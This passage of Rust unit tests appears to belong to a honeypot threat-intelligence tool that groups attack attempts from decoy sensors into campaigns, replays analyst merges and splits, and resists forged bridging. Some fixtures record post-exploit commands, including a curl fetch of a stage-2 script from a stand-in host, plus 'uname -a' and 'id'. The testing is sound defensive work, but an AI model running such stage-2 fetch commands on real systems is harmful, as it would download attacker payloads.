        let x = extract(
            &attempts,
            &events,
            &ConfidenceConfig::default(),
            ExtractOptions::default(),
        );
        Run {
            attempts,
            x,
            signals: BTreeMap::new(),
            asns: BTreeMap::new(),
            registry: Registry::default(),
        }
    }

    fn run(r: &Run, actions: &[CampaignAction]) -> Clustering {
        run_at(r, actions, T0 + HOUR_MS)
    }

    fn run_at(r: &Run, actions: &[CampaignAction], now: i64) -> Clustering {
        cluster(
            &Input {
                tenant_id: "t1",
                attempts: &r.attempts,
                iocs: &r.x,
                signals: &r.signals,
                asns: &r.asns,
                advisories: &BTreeMap::new(),
                actions,
                registry: &r.registry,
                now,
            },
            Params::default(),
            &ConfidenceConfig::default(),
        )
    }

    fn wave() -> Vec<Value> {
        vec![
            post("a1", T0, "d1", "203.0.113.1", HASH),
            post("a2", T0 + 1000, "d2", "203.0.113.2", HASH),
            post("a3", T0 + 2000, "d3", "203.0.113.3", HASH),
            post("a4", T0 + 3000, "d4", "203.0.113.4", &"ab".repeat(32)),
        ]
    }

    #[test]
    fn same_payload_hash_on_three_sensors_is_one_campaign() {
        let r = prepare(wave());
        let c = run(&r, &[]);
        assert_eq!(c.campaigns.len(), 1);
        let k = &c.campaigns[0];
        assert_eq!(k.attempt_ids.len(), 3);
        assert_eq!(k.sensor_ids.len(), 3);
        assert_eq!(k.status, CampaignStatus::Active);
        assert_eq!(k.confidence.band, Band::Medium);
        assert_eq!(k.confidence.wording, "possible");
        assert!(
            !k.confidence.publishable,
            "clustering alone never publishes"
        );
        assert!(valid_campaign_id(&k.campaign_id));
        assert_eq!(k.campaign_id, campaign_id("t1", &k.seed.attempt_id));
        assert_eq!(k.seed.features, vec![Feature::PayloadSha256]);
        assert!(
            k.members.iter().all(
                |m| !m.joined_by.is_empty() && m.joined_by[0].feature == Feature::PayloadSha256
            )
        );
        assert_eq!(k.feature_summary.payload.payload_sha256.count, 1);
        assert!(k.suggested_actor_links.is_empty());
        assert!(k.title.starts_with("Payload hash"));
    }

    #[test]
    fn deterministic_in_any_input_order() {
        let r = prepare(wave());
        let mut rev = wave();
        rev.reverse();
        let r2 = prepare(rev);
        assert_eq!(run(&r, &[]), run(&r2, &[]));
    }

    #[test]
    fn probes_sharing_only_an_asn_form_no_campaign() {
        let mut r = prepare(vec![
            app(
                "p1",
                T0,
                "d1",
                "203.0.113.10",
                json!({"method": "GET", "path": "/"}),
            ),
            app(
                "p2",
                T0 + 10,
                "d2",
                "203.0.113.11",
                json!({"method": "GET", "path": "/"}),
            ),
        ]);
        r.asns.insert("203.0.113.10".into(), 64498);
        r.asns.insert("203.0.113.11".into(), 64498);
        assert!(run(&r, &[]).campaigns.is_empty());
    }

    #[test]
    fn asn_and_cve_alone_is_low_and_emerging() {
        let mut r = prepare(vec![
            hook("h1", T0, "d1", "203.0.113.10"),
            hook("h2", T0 + 10, "d2", "203.0.113.11"),
        ]);
        r.asns.insert("203.0.113.10".into(), 64498);
        r.asns.insert("203.0.113.11".into(), 64498);
        let c = run(&r, &[]);
        assert_eq!(c.campaigns.len(), 1);
        let k = &c.campaigns[0];
        assert_eq!(k.confidence.band, Band::Low);
        assert_eq!(k.status, CampaignStatus::Emerging);
        assert_eq!(k.seed.features, vec![Feature::AsnCve]);
        assert_eq!(k.feature_summary.targeting.cves, vec!["FOILED-DEMO-0001"]);
    }

    #[test]
    fn join_gap_splits_and_closed_after_idle() {
        let r = prepare(vec![
            post("a1", T0, "d1", "203.0.113.1", HASH),
            post("a2", T0 + 8 * DAY_MS, "d2", "203.0.113.2", HASH),
        ]);
        assert!(run(&r, &[]).campaigns.is_empty(), "more than the gap apart");
        let r = prepare(wave());
        let c = run_at(&r, &[], T0 + 30 * DAY_MS);
        assert_eq!(c.campaigns[0].status, CampaignStatus::Closed);
    }

    #[test]
    fn other_tenants_are_ignored() {
        let mut r = prepare(wave());
        for a in &mut r.attempts {
            a.tenant_id = "t2".into();
        }
        assert!(run(&r, &[]).campaigns.is_empty());
    }

    #[test]
    fn weak_keys_do_not_bridge_two_established_campaigns() {
        let other = "cd".repeat(32);
        let mut r = prepare(vec![
            post("a1", T0, "d1", "203.0.113.1", HASH),
            post("a2", T0 + 10, "d2", "203.0.113.2", HASH),
            // A different path, so the two chains have different behaviour
            // fingerprints and only the ASN and CVE are shared.
            post_to("b1", T0 + 20, "d3", "198.51.100.1", &other, "/api/import"),
            post_to("b2", T0 + 30, "d4", "198.51.100.2", &other, "/api/import"),
            hook("a1h", T0 + 1, "d1", "203.0.113.1"),
            hook("b1h", T0 + 21, "d3", "198.51.100.1"),
        ]);
        r.asns.insert("203.0.113.1".into(), 64498);
        r.asns.insert("198.51.100.1".into(), 64498);
        let c = run(&r, &[]);
        assert_eq!(c.campaigns.len(), 2);
        assert!(c.notes.iter().any(|n| n.contains("bridged")));
    }

    fn action(id: &str, kind: ActionKind, c: &Campaign) -> CampaignAction {
        CampaignAction {
            action_id: id.into(),
            kind,
            campaign_id: c.campaign_id.clone(),
            anchor_attempt_ids: c
                .attempt_ids
                .iter()
                .rev()
                .take(MAX_ANCHORS)
                .cloned()
                .collect(),
            title: None,
            status: None,
            merge: vec![],
            attempt_ids: vec![],
            feedback: None,
            note: "reviewed".into(),
            analyst_id: "analyst".into(),
            at: T0 + 100,
        }
    }

    #[test]
    fn analyst_label_feedback_merge_and_split_replay() {
        let other = "cd".repeat(32);
        let mut events = wave();
        events.push(post("b1", T0 + 20, "d5", "198.51.100.1", &other));
        events.push(post("b2", T0 + 30, "d6", "198.51.100.2", &other));
        let r = prepare(events);
        let base = run(&r, &[]);
        assert_eq!(base.campaigns.len(), 2);
        let (a, b) = (&base.campaigns[0], &base.campaigns[1]);

        let mut label = action("act1", ActionKind::Label, a);
        label.title = Some("Upload <wave>".into());
        let mut fb = action("act2", ActionKind::Feedback, a);
        fb.feedback = Some(Feedback::TruePositive);
        let mut merge = action("act3", ActionKind::Merge, a);
        merge.merge = vec![CampaignRef {
            campaign_id: b.campaign_id.clone(),
            anchor_attempt_ids: b.attempt_ids.clone(),
        }];
        merge.at += 1;
        let c = run(&r, &[merge.clone(), label.clone(), fb.clone()]);
        assert_eq!(c.campaigns.len(), 1);
        let m = &c.campaigns[0];
        assert_eq!(m.campaign_id, a.campaign_id);
        assert_eq!(m.attempt_ids.len(), 5);
        assert_eq!(m.analyst.merged_from, vec![b.campaign_id.clone()]);
        assert_eq!(m.title, printable("Upload <wave>"));
        assert_eq!(
            (m.confidence.score, m.confidence.wording.as_str()),
            (100, "confirmed")
        );
        assert_eq!(m.analyst.action_ids, vec!["act1", "act2", "act3"]);
        let added: Vec<_> = m.members.iter().filter(|x| x.added_by.is_some()).collect();
        assert_eq!(added.len(), 2);
        let links = member_links(&ConfidenceConfig::default(), m);
        assert_eq!(links.len(), 5);
        assert!(links.iter().filter(|l| l.wording == "confirmed").count() == 2);

        // Split the merged-in pair back out: the named attempts move.
        let mut split = action("act4", ActionKind::Split, m);
        split.attempt_ids = b.attempt_ids.clone();
        split.at += 10;
        let c = run(&r, &[merge, label, fb, split]);
        assert_eq!(c.campaigns.len(), 2);
        let kept = c.get(&a.campaign_id).unwrap();
        assert_eq!(kept.attempt_ids.len(), 3);
        let out = c.get(&split_campaign_id("t1", "act4")).expect("split side");
        assert_eq!(out.attempt_ids, b.attempt_ids);
        assert_eq!(
            out.analyst.split_from.as_deref(),
            Some(a.campaign_id.as_str())
        );
    }

    #[test]
    fn actions_for_campaigns_outside_the_window_wait() {
        let r = prepare(wave());
        let base = run(&r, &[]);
        let mut a = action("act1", ActionKind::Status, &base.campaigns[0]);
        a.campaign_id = "cmp_000000000000000000000000".into();
        a.anchor_attempt_ids = vec!["att_missing".into()];
        a.status = Some(CampaignStatus::Closed);
        let c = run(&r, &[a.clone()]);
        assert_eq!(c.campaigns[0].status, CampaignStatus::Active);
        // Anchors alone still find the campaign.
        a.anchor_attempt_ids = vec![base.campaigns[0].attempt_ids[1].clone()];
        assert_eq!(run(&r, &[a]).campaigns[0].status, CampaignStatus::Closed);
    }

    fn day(d: i64) -> i64 {
        T0 + d * DAY_MS
    }

    #[test]
    fn ids_labels_and_merges_survive_the_seed_leaving_the_window() {
        let other = "cd".repeat(32);
        let all = [
            post("a1", day(0), "d1", "203.0.113.1", HASH),
            post("b1", day(0) + HOUR_MS, "d5", "198.51.100.1", &other),
            post("a2", day(3), "d2", "203.0.113.2", HASH),
            post("b2", day(4), "d6", "198.51.100.2", &other),
            post("a3", day(6), "d3", "203.0.113.3", HASH),
            post("b3", day(8), "d7", "198.51.100.3", &other),
            post("a4", day(9), "d4", "203.0.113.4", HASH),
        ];
        let window = |from: i64, to: i64| {
            all.iter()
                .filter(|e| (from..to).contains(&e["ts"].as_i64().unwrap()))
                .cloned()
                .collect::<Vec<_>>()
        };

        // Week one: two campaigns. Label A, merge B into it.
        let mut r1 = prepare(window(day(0), day(7)));
        let base = run_at(&r1, &[], day(7));
        assert_eq!(base.campaigns.len(), 2);
        let (a, b) = (&base.campaigns[0], &base.campaigns[1]);
        let mut label = action("act1", ActionKind::Label, a);
        label.title = Some("Upload wave".into());
        let mut merge = action("act2", ActionKind::Merge, a);
        merge.merge = vec![CampaignRef {
            campaign_id: b.campaign_id.clone(),
            anchor_attempt_ids: b.attempt_ids.iter().rev().cloned().collect(),
        }];
        merge.at += 1;
        let actions = vec![label, merge];
        let w1 = run_at(&r1, &actions, day(7));
        assert_eq!(w1.campaigns.len(), 1);
        r1.registry.apply(&w1.registry_update);
        let again = cluster(
            &Input {
                tenant_id: "t1",
                attempts: &r1.attempts,
                iocs: &r1.x,
                signals: &r1.signals,
                asns: &r1.asns,
                advisories: &BTreeMap::new(),
                actions: &actions,
                registry: &r1.registry,
                now: day(7),
            },
            Params::default(),
            &ConfidenceConfig::default(),
        );
        assert!(
            again.registry_update.is_empty(),
            "steady state writes nothing"
        );

        // Week two: both seeds (a1, b1) are out of the window.
        let mut r2 = prepare(window(day(2), day(10)));
        let without = run_at(&r2, &actions, day(10));
        assert!(
            without.get(&a.campaign_id).is_none(),
            "without the registry the id would move"
        );
        r2.registry = r1.registry.clone();
        let w2 = run_at(&r2, &actions, day(10));
        assert_eq!(w2.campaigns.len(), 1, "{:?}", w2.notes);
        let c = &w2.campaigns[0];
        assert_eq!(c.campaign_id, a.campaign_id);
        assert_eq!(c.title, "Upload wave");
        assert_eq!(c.attempt_ids.len(), 5, "a2 a3 a4 b2 b3");
        assert_eq!(c.analyst.merged_from, vec![b.campaign_id.clone()]);
        assert!(w2.notes.is_empty(), "{:?}", w2.notes);
        // The new attempts are recorded under their live campaigns; the
        // merge is not written to the registry, it is replayed.
        let recorded: BTreeMap<&str, &str> = w2
            .registry_update
            .members
            .iter()
            .map(|m| (m.attempt_id.as_str(), m.campaign_id.as_str()))
            .collect();
        assert_eq!(recorded.len(), 2, "a4 and b3: {recorded:?}");
        let mut ids: Vec<&str> = recorded.values().copied().collect();
        ids.sort();
        let mut want = vec![a.campaign_id.as_str(), b.campaign_id.as_str()];
        want.sort();
        assert_eq!(ids, want);
    }

    #[test]
    fn a_lone_member_in_the_window_keeps_its_campaign_id() {
        let mut r1 = prepare(wave());
        let c1 = run(&r1, &[]);
        r1.registry.apply(&c1.registry_update);
        let id = c1.campaigns[0].campaign_id.clone();
        // A window with only a3 of the campaign in it.
        let mut r2 = prepare(vec![post("a3", T0 + 2000, "d3", "203.0.113.3", HASH)]);
        r2.registry = r1.registry.clone();
        let c2 = run(&r2, &[]);
        assert!(c2.campaigns.is_empty());
        let a3 = &r2.attempts[0].attempt_id;
        assert_eq!(c2.carried.get(a3), Some(&id));
        let mut attempts = r2.attempts.clone();
        attach(&mut attempts, &mut r2.x.clone(), &c2);
        assert_eq!(attempts[0].campaign_id.as_ref(), Some(&id));
    }

    fn hook_chain(i: usize, ts: i64, src: &str, egress: bool) -> Vec<Value> {
        let decoy = format!("d{i}");
        let mut get = app(
            &format!("g{i}"),
            ts,
            &decoy,
            src,
            json!({"method": "GET", "path": "/admin", "user_agent": "Mozilla/5.0"}),
        );
        get["source"] = json!({"kind": "host", "id": "host-1"});
        let mut out = vec![get, hook(&format!("h{i}"), ts + 5, &decoy, src)];
        if egress {
            let mut e = app(
                &format!("e{i}"),
                ts + 10,
                &decoy,
                "10.85.1.2",
                json!({"method": "GET"}),
            );
            e["channel"] = json!("egress");
            out.push(e);
        }
        out
    }

    #[test]
    fn generic_hook_hits_from_one_asn_stay_low_and_emerging() {
        // Three sources on three days hit the same public hook after a
        // generic GET, from one cloud ASN with a common user agent.
        let srcs = ["203.0.113.70", "203.0.113.71", "203.0.113.72"];
        let events = srcs
            .iter()
            .enumerate()
            .flat_map(|(i, s)| hook_chain(i, day(i as i64), s, false))
            .collect();
        let mut r = prepare(events);
        for s in srcs {
            r.asns.insert(s.into(), 64500);
        }
        let c = run_at(&r, &[], day(3));
        assert_eq!(
            c.campaigns.len(),
            1,
            "joined only by ASN and CVE and request shape"
        );
        for k in &c.campaigns {
            assert_eq!(k.status, CampaignStatus::Emerging, "{}", k.title);
            assert_eq!(k.confidence.band, Band::Low);
            assert!(
                k.members
                    .iter()
                    .flat_map(|m| &m.joined_by)
                    .all(|j| j.strength == Strength::Weak
                        && j.feature != Feature::BehaviourFingerprint)
            );
        }
    }

    #[test]
    fn a_fingerprint_shared_by_many_sources_only_joins_weakly() {
        let events = (0..12)
            .flat_map(|i| {
                hook_chain(
                    i,
                    T0 + i as i64 * 60_000,
                    &format!("198.51.100.{}", 10 + i),
                    true,
                )
            })
            .collect();
        let r = prepare(events);
        let c = run(&r, &[]);
        assert_eq!(c.campaigns.len(), 1);
        let k = &c.campaigns[0];
        let bf = &k.members[0].joined_by[0];
        assert_eq!(bf.feature, Feature::BehaviourFingerprint);
        assert_eq!(bf.strength, Strength::Weak, "common to 12 sources");
        assert_eq!(k.status, CampaignStatus::Emerging);
        assert!(k.confidence.score < 40);
    }

    #[test]
    fn junk_bodies_cannot_push_out_a_shared_hash() {
        let mut events = wave();
        // One attempt sends 200 unique bodies before the shared one.
        for i in 0..200 {
            events.push(post(
                &format!("j{i}"),
                T0 + 10_000 + i,
                "d9",
                "198.51.100.66",
                &format!("{i:064x}"),
            ));
        }
        events.push(post("j-shared", T0 + 20_000, "d9", "198.51.100.66", HASH));
        let r = prepare(events);
        let c = run(&r, &[]);
        assert_eq!(c.campaigns.len(), 1);
        assert_eq!(
            c.campaigns[0].attempt_ids.len(),
            4,
            "the junk sender is still in"
        );
        assert!(
            c.notes.is_empty(),
            "unique junk never competes: {:?}",
            c.notes
        );

        // Junk shared between two attempts does compete, and is noted on
        // every attempt that hit the cap, members or not.
        let mut events = Vec::new();
        for i in 0..20 {
            let h = format!("{:064x}", 1000 + i);
            events.push(post(&format!("x{i}"), T0 + i, "d8", "198.51.100.77", &h));
            events.push(post(&format!("y{i}"), T0 + i, "d9", "198.51.100.78", &h));
        }
        let r = prepare(events);
        let c = run(&r, &[]);
        let capped = c
            .notes
            .iter()
            .filter(|n| n.contains("than the cap"))
            .count();
        assert_eq!(capped, 2, "{:?}", c.notes);
    }

    #[test]
    fn feedback_spam_never_sheds_structural_actions() {
        let other = "cd".repeat(32);
        let mut events = wave();
        events.push(post("b1", T0 + 20, "d5", "198.51.100.1", &other));
        events.push(post("b2", T0 + 30, "d6", "198.51.100.2", &other));
        let r = prepare(events);
        let base = run(&r, &[]);
        let (a, b) = (&base.campaigns[0], &base.campaigns[1]);
        let mut merge = action("act0", ActionKind::Merge, a);
        merge.merge = vec![CampaignRef {
            campaign_id: b.campaign_id.clone(),
            anchor_attempt_ids: b.attempt_ids.clone(),
        }];
        let mut actions = vec![merge];
        for i in 0..(MAX_FEEDBACK_ACTIONS + 100) {
            let mut f = action(&format!("fb{i:05}"), ActionKind::Feedback, a);
            f.feedback = Some(Feedback::Unsure);
            f.at += 1 + i as i64;
            actions.push(f);
        }
        let c = run(&r, &actions);
        assert_eq!(c.campaigns.len(), 1, "the merge still applies");
        assert!(c.notes.iter().any(|n| n.contains("feedback action")));
    }

    #[test]
    fn a_weak_join_in_a_narrow_window_never_merges_recorded_campaigns() {
        // A and B form on strong keys; a2 and b1 share only a source that
        // reached exploit on both.
        let other = "cd".repeat(32);
        let shared = "203.0.113.99";
        let a2 = || {
            vec![
                post("a2", T0 + 1000, "d2", shared, HASH),
                hook("a2h", T0 + 1001, "d2", shared),
            ]
        };
        let b1 = || {
            vec![
                post("b1", T0 + 2000, "d5", shared, &other),
                hook("b1h", T0 + 2001, "d5", shared),
            ]
        };
        let mut all = vec![
            post("a1", T0, "d1", "203.0.113.1", HASH),
            post("a3", T0 + 3000, "d3", "203.0.113.3", HASH),
            post("b2", T0 + 4000, "d6", "198.51.100.2", &other),
            post("b3", T0 + 5000, "d7", "198.51.100.3", &other),
        ];
        all.extend(a2());
        all.extend(b1());

        // A full read records A and B.
        let mut full = prepare(all.clone());
        let c = run(&full, &[]);
        assert_eq!(c.campaigns.len(), 2);
        full.registry.apply(&c.registry_update);

        // A narrow window holding only a2 and b1: they join weakly when
        // nothing is recorded, and nothing is written.
        let mut narrow = prepare([a2(), b1()].concat());
        let weak = run(&narrow, &[]);
        assert_eq!(weak.campaigns.len(), 1, "weak join in isolation");
        assert!(
            weak.registry_update.is_empty(),
            "weak joins are never recorded"
        );
        // With the registry, the recorded attempts count as established and
        // the weak key cannot bridge them.
        narrow.registry = full.registry.clone();
        let guarded = run(&narrow, &[]);
        assert!(guarded.campaigns.is_empty(), "{:?}", guarded.campaigns);
        assert!(guarded.registry_update.is_empty());
        full.registry.apply(&weak.registry_update);
        full.registry.apply(&guarded.registry_update);

        // The next full read still has two campaigns.
        let again = run(&full, &[]);
        assert_eq!(again.campaigns.len(), 2);
        assert!(again.notes.iter().any(|n| n.contains("bridged")));
    }

    #[test]
    fn stale_registry_writes_cannot_undo_newer_ones() {
        let rec = |id: &str, created: i64, merged: Option<&str>| StoredCampaign {
            campaign_id: id.into(),
            created_at: created,
            first_seen: 10,
            last_seen: 20,
            merged_into: merged.map(str::to_string),
            attempts: 0,
        };
        let member = |a: &str, c: &str| MemberRecord {
            attempt_id: a.into(),
            campaign_id: c.into(),
            attempt_first_seen: 10,
        };
        let mut r = Registry::default();
        r.apply(&RegistryUpdate {
            campaigns: vec![rec("cmp_old", 1, None), rec("cmp_new", 5, Some("cmp_old"))],
            members: vec![member("att_1", "cmp_old")],
            bridges: vec![],
        });
        // A stale reader: newer created_at, merged_into cleared, a self
        // merge, and the attempt moved to a newer campaign.
        r.apply(&RegistryUpdate {
            campaigns: vec![rec("cmp_old", 9, Some("cmp_old")), rec("cmp_new", 9, None)],
            members: vec![member("att_1", "cmp_new")],
            bridges: vec![],
        });
        assert_eq!(r.campaigns["cmp_old"].created_at, 1);
        assert_eq!(r.campaigns["cmp_old"].merged_into, None, "never itself");
        assert_eq!(
            r.campaigns["cmp_new"].merged_into.as_deref(),
            Some("cmp_old")
        );
        assert_eq!(
            r.members["att_1"], "cmp_old",
            "memberships only move to older"
        );
        assert_eq!(r.resolve("cmp_new"), "cmp_old");
    }

    fn post_exploit(i: usize, src: &str, cmd: &str) -> Vec<Value> {
        let decoy = format!("d{i}");
        let mut h = hook(&format!("pe{i}"), T0 + i as i64 * 60_000, &decoy, src);
        h["hook"]["stage"] = json!("post_exploit");
        h["hook"]["cmd_lines"] = json!([cmd]);
        vec![
            app(
                &format!("pg{i}"),
                T0 + i as i64 * 60_000 - 1,
                &decoy,
                src,
                json!({"method": "POST", "path": format!("/x{i}")}),
            ),
            h,
        ]
    }

    #[test]
    fn a_botnet_wave_still_forms_on_shared_commands_and_stage2() {
        // Twelve sources run the same command: the command line keeps its
        // medium strength (only fingerprints are demoted when common).
        let events = (0..12)
            .flat_map(|i| post_exploit(i, &format!("198.51.100.{}", 10 + i), "uname -a"))
            .collect();
        let c = run(&prepare(events), &[]);
        assert_eq!(c.campaigns.len(), 1);
        let joins: Vec<&Join> = c.campaigns[0]
            .members
            .iter()
            .flat_map(|m| &m.joined_by)
            .filter(|j| j.feature == Feature::Cmdline)
            .collect();
        assert!(!joins.is_empty() && joins.iter().all(|j| j.strength == Strength::Medium));

        // The same wave fetching one stage 2 is active.
        let events = (0..12)
            .flat_map(|i| {
                post_exploit(
                    i,
                    &format!("198.51.100.{}", 10 + i),
                    "curl -s http://stage2.example.invalid/b.sh",
                )
            })
            .collect();
        let c = run(&prepare(events), &[]);
        assert_eq!(c.campaigns.len(), 1);
        assert_eq!(c.campaigns[0].status, CampaignStatus::Active);

        // A command shared by 3 of 8 sources stays medium too.
        let mut events: Vec<Value> = (0..3)
            .flat_map(|i| post_exploit(i, &format!("198.51.100.{}", 10 + i), "uname -a"))
            .collect();
        for i in 3..8 {
            events.extend(post_exploit(
                i,
                &format!("198.51.100.{}", 10 + i),
                &format!("id {i}"),
            ));
        }
        let c = run(&prepare(events), &[]);
        let cmd = c.campaigns[0].members[0]
            .joined_by
            .iter()
            .find(|j| j.feature == Feature::Cmdline)
            .unwrap();
        assert_eq!(cmd.strength, Strength::Medium);
    }

    #[test]
    fn junk_shared_by_two_attackers_cannot_split_a_wave() {
        for junk in [15, 16, 20] {
            let mut events = wave();
            events.truncate(3);
            events.push(post("a5", T0 + 2500, "d8", "203.0.113.5", HASH));
            for (src, decoy, tag) in [("198.51.100.77", "d9", "x"), ("198.51.100.78", "d10", "y")] {
                for i in 0..junk {
                    events.push(post(
                        &format!("{tag}{i}"),
                        T0 + 4000 + i,
                        decoy,
                        src,
                        &format!("{:064x}", 1000 + i),
                    ));
                }
                events.push(post(&format!("{tag}-h"), T0 + 4100, decoy, src, HASH));
            }
            let c = run(&prepare(events), &[]);
            assert_eq!(c.campaigns.len(), 1, "junk {junk}: {:?}", c.notes);
            assert_eq!(c.campaigns[0].attempt_ids.len(), 6, "junk {junk}");
        }
    }

    #[test]
    fn writers_in_any_order_never_leave_a_merge_cycle() {
        let rec = |id: &str, created: i64, merged: Option<&str>| StoredCampaign {
            campaign_id: id.into(),
            created_at: created,
            first_seen: 10,
            last_seen: 20,
            merged_into: merged.map(str::to_string),
            attempts: 0,
        };
        // Two racing first writers disagree on which campaign is older and
        // each folds the other into the one it thinks is older.
        let w1 = RegistryUpdate {
            campaigns: vec![rec("cmp_x", 5, None), rec("cmp_y", 6, Some("cmp_x"))],
            ..Default::default()
        };
        let w2 = RegistryUpdate {
            campaigns: vec![rec("cmp_y", 3, None), rec("cmp_x", 4, Some("cmp_y"))],
            ..Default::default()
        };
        for (first, second) in [(&w1, &w2), (&w2, &w1)] {
            let mut r = Registry::default();
            r.apply(first);
            r.apply(second);
            let x = r.campaigns["cmp_x"].merged_into.clone();
            let y = r.campaigns["cmp_y"].merged_into.clone();
            assert!(x.is_none() || y.is_none(), "no cycle: {x:?} {y:?}");
            assert_eq!(r.resolve("cmp_x"), r.resolve("cmp_y"));
            // created_at is whatever the first insert said, never moved.
            let first_x = first
                .campaigns
                .iter()
                .find(|c| c.campaign_id == "cmp_x")
                .unwrap()
                .created_at;
            assert_eq!(r.campaigns["cmp_x"].created_at, first_x);
        }
    }

    #[test]
    fn resolve_breaks_an_old_cycle_at_its_oldest_campaign() {
        let mut r = Registry::default();
        for (id, created, into) in [
            ("cmp_a", 3, "cmp_b"),
            ("cmp_b", 1, "cmp_c"),
            ("cmp_c", 2, "cmp_a"),
        ] {
            r.campaigns.insert(
                id.into(),
                StoredCampaign {
                    campaign_id: id.into(),
                    created_at: created,
                    first_seen: 0,
                    last_seen: 0,
                    merged_into: Some(into.into()),
                    attempts: 0,
                },
            );
        }
        for start in ["cmp_a", "cmp_b", "cmp_c"] {
            assert_eq!(r.resolve(start), "cmp_b", "from {start}");
        }
    }

    fn forged_fleet(forgers: &[&str]) -> Vec<Value> {
        let other = "cd".repeat(32);
        let mut events = vec![
            post("a1", T0, "d1", "203.0.113.1", HASH),
            post("a2", T0 + 10, "d2", "203.0.113.2", HASH),
            post("a3", T0 + 20, "d3", "203.0.113.3", HASH),
            post("b1", T0 + 30, "d4", "198.51.100.1", &other),
            post("b2", T0 + 40, "d5", "198.51.100.2", &other),
            post("b3", T0 + 50, "d6", "198.51.100.3", &other),
        ];
        // Each forger sends both campaigns' public bodies to one decoy.
        for (i, src) in forgers.iter().enumerate() {
            let decoy = format!("dz{i}");
            events.push(post(
                &format!("f{i}a"),
                T0 + 60 + i as i64,
                &decoy,
                src,
                HASH,
            ));
            events.push(post(
                &format!("f{i}b"),
                T0 + 61 + i as i64,
                &decoy,
                src,
                &other,
            ));
        }
        events
    }

    #[test]
    fn one_source_cannot_bridge_two_established_campaigns() {
        let r = prepare(forged_fleet(&["192.0.2.66"]));
        let c = run(&r, &[]);
        assert_eq!(c.campaigns.len(), 2, "{:?}", c.notes);
        let linked: Vec<&Campaign> = c
            .campaigns
            .iter()
            .filter(|k| !k.possible_links.is_empty())
            .collect();
        assert_eq!(linked.len(), 2, "both sides show the possible link");
        assert_eq!(linked[0].possible_links[0].src, "192[.]0[.]2[.]66");
        assert!(c.notes.iter().any(|n| n.contains("possible link")));

        // Two independent sources make the link real.
        let r = prepare(forged_fleet(&["192.0.2.66", "192.0.2.67"]));
        let c = run(&r, &[]);
        assert_eq!(c.campaigns.len(), 1);
        assert!(c.campaigns[0].possible_links.is_empty());
    }

    #[test]
    fn a_forged_bridge_never_merges_recorded_campaigns_and_real_ones_leave_provenance() {
        // Week one: A and B are recorded apart.
        let mut base = prepare(forged_fleet(&[]));
        let c = run(&base, &[]);
        assert_eq!(c.campaigns.len(), 2);
        base.registry.apply(&c.registry_update);

        // A single forger arrives: still two campaigns, nothing merged.
        let mut one = prepare(forged_fleet(&["192.0.2.66"]));
        one.registry = base.registry.clone();
        let c1 = run(&one, &[]);
        assert_eq!(c1.campaigns.len(), 2);
        assert!(
            c1.registry_update
                .campaigns
                .iter()
                .all(|k| k.merged_into.is_none())
        );
        let mut after = base.registry.clone();
        after.apply(&c1.registry_update);
        one.registry = after;
        assert_eq!(run(&one, &[]).campaigns.len(), 2, "and stays two");

        // Two independent bridges merge them, with provenance recorded.
        let mut two = prepare(forged_fleet(&["192.0.2.66", "192.0.2.67"]));
        two.registry = base.registry.clone();
        let c2 = run(&two, &[]);
        assert_eq!(c2.campaigns.len(), 1);
        let merged = c2
            .registry_update
            .campaigns
            .iter()
            .find(|k| k.merged_into.is_some())
            .expect("the newer campaign folds into the older");
        assert!(!c2.registry_update.bridges.is_empty());
        let b = &c2.campaigns[0].bridges;
        assert!(
            b.iter()
                .any(|x| x.merged_campaign_id.as_deref() == Some(merged.campaign_id.as_str())),
            "{b:?}"
        );
        assert!(b.iter().all(|x| x.feature == Feature::PayloadSha256));
    }

    #[test]
    fn every_merge_the_registry_keeps_has_provenance() {
        // Two independent forgers on a first read: one campaign, and the
        // recorded merge names the bridging attempts.
        let r = prepare(forged_fleet(&["192.0.2.66", "192.0.2.67"]));
        let c = run(&r, &[]);
        assert_eq!(c.campaigns.len(), 1);
        let b = &c.registry_update.bridges;
        assert!(!b.is_empty());
        assert!(
            b.iter()
                .all(|x| x.merged_campaign_id.is_none() && !x.small_halves)
        );
        let forgers: BTreeSet<&str> = r
            .attempts
            .iter()
            .filter(|a| a.src.starts_with("192.0.2."))
            .map(|a| a.attempt_id.as_str())
            .collect();
        assert!(b.iter().any(|x| forgers.contains(x.attempt_id.as_str())
            || forgers.contains(x.with_attempt_id.as_str())));
        let mut reg = Registry::default();
        reg.apply(&c.registry_update);
        assert_eq!(reg.bridges.len(), b.len(), "kept once recorded");

        // Halves below the guard size merge, flagged for audit.
        let other = "cd".repeat(32);
        let small = vec![
            post("a1", T0, "d1", "203.0.113.1", HASH),
            post("a2", T0 + 10, "d2", "203.0.113.2", HASH),
            post("b1", T0 + 20, "d4", "198.51.100.1", &other),
            post("b2", T0 + 30, "d5", "198.51.100.2", &other),
            post("f1", T0 + 40, "dz", "192.0.2.66", HASH),
            post("f2", T0 + 41, "dz", "192.0.2.66", &other),
        ];
        let r = prepare(small);
        let c = run(&r, &[]);
        assert_eq!(c.campaigns.len(), 1);
        let b = &c.registry_update.bridges;
        assert!(!b.is_empty() && b.iter().all(|x| x.small_halves), "{b:?}");
        assert_eq!(c.campaigns[0].bridges, *b);

        // Steady state writes no new provenance.
        let mut r = r;
        r.registry.apply(&c.registry_update);
        assert!(run(&r, &[]).registry_update.is_empty());
    }

    #[test]
    fn action_problems_are_reported() {
        let r = prepare(wave());
        let base = run(&r, &[]);
        let mut a = action("x", ActionKind::Label, &base.campaigns[0]);
        assert!(!a.problems().is_empty());
        a.title = Some("t".repeat(MAX_TITLE_CHARS + 1));
        assert!(!a.problems().is_empty());
        a.title = Some("Wave".into());
        assert!(a.problems().is_empty());
        let mut s = action("y", ActionKind::Split, &base.campaigns[0]);
        assert!(!s.problems().is_empty());
        s.attempt_ids = vec![base.campaigns[0].attempt_ids[0].clone()];
        assert!(s.problems().is_empty());
        s.feedback = Some(Feedback::Unsure);
        assert_eq!(s.problems(), vec!["feedback is only for feedback"]);
    }

    #[test]
    fn attach_fills_attempts_and_iocs() {
        let mut r = prepare(wave());
        let c = run(&r, &[]);
        let id = c.campaigns[0].campaign_id.clone();
        attach(&mut r.attempts, &mut r.x, &c);
        assert_eq!(
            r.attempts
                .iter()
                .filter(|a| a.campaign_id.as_deref() == Some(id.as_str()))
                .count(),
            3
        );
        let hash = r.x.iocs.iter().find(|i| i.value == HASH).unwrap();
        assert_eq!(hash.campaign_ids, vec![id]);
    }

    #[test]
    fn alerts_for_new_and_grown_campaigns_only() {
        let r = prepare(wave());
        let c = run(&r, &[]);
        let k = &c.campaigns[0];
        let new = alerts(&BTreeMap::new(), &c.campaigns);
        assert_eq!(new.len(), 1);
